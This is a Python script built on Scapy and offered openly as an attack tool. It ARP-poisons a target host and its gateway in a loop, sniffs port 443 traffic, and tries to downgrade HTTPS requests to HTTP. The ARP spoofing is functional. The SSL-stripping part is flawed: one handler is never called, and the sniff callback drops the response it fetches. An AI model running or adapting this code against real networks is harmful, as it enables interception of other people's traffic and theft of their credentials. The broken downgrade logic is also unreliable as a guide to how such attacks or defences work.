from scapy.layers.inet import IP, TCP  # Import necessary layers
from scapy.all import ARP, Ether, srp, send, sniff
import socket
import threading
import time
import sys

# Define the target network
TARGET_IP = "10.0.1.33"  # Target client IP (replace with your target IP)
ROUTER_IP = "10.0.1.138"   # Router IP (your gateway)
GATEWAY_IP = "10.0.1.138"  # Gateway router IP
PORT = 443  # SSL Port

# Function to perform ARP Spoofing
def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    # Send ARP requests to poison the target and gateway
    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    send(arp_target, verbose=False)
    send(arp_gateway, verbose=False)

# Function to get the MAC address of an IP
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

# Function to handle client communication
def handle_client(client_socket):
    request = client_socket.recv(1024)

    if b"HTTPS" in request:
        # Strip SSL by downgrading the request to HTTP
        request = request.replace(b"HTTPS", b"HTTP")

    # Forward the modified request to the target server on HTTP (port 80)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as forward_socket:
        forward_socket.connect((TARGET_IP, 80))
        forward_socket.send(request)

        # Receive response from the target server
        response = forward_socket.recv(4096)

        # Send the response back to the client (simulate HTTP)
        client_socket.send(response)

    client_socket.close()

# Start sniffing the traffic
def packet_callback(packet):
    try:
        if packet.haslayer(TCP) and packet.haslayer(IP):
            if packet[TCP].dport == PORT:
                print(f"Intercepted traffic to {TARGET_IP}:{PORT}")

                # Create a socket for communication
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((TARGET_IP, PORT))

                # Send HTTP instead of HTTPS
                request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\nConnection: close\r\n\r\n"
                client_socket.send(request.encode())

                # Receive the response
                response = client_socket.recv(4096)

                # Send back to the client
                print(f"Sending downgraded HTTP response to client")
                client_socket.close()
    except Exception as e:
        print(f"Error while handling packet: {e}")

# ARP Spoofing thread
def start_arp_spoof():
    while True:
        try:
            arp_spoof(TARGET_IP, GATEWAY_IP)
            time.sleep(2)
        except Exception as e:
            print(f"Error in ARP Spoofing: {e}")
            break

# Main function to run the attack
def main():
    # Start ARP poisoning in a background thread
    arp_thread = threading.Thread(target=start_arp_spoof)
    arp_thread.daemon = True  # Ensure the thread exits when the main program exits
    arp_thread.start()

    try:
        # Start sniffing and handling packets
        print("Starting sniffer...")
        sniff(filter="tcp port 443", prn=packet_callback, store=0, stop_filter=lambda x: False)
    except KeyboardInterrupt:
        print("\nSniffer stopped.")
        sys.exit(0)
    except Exception as e:
        print(f"Error in sniffing: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
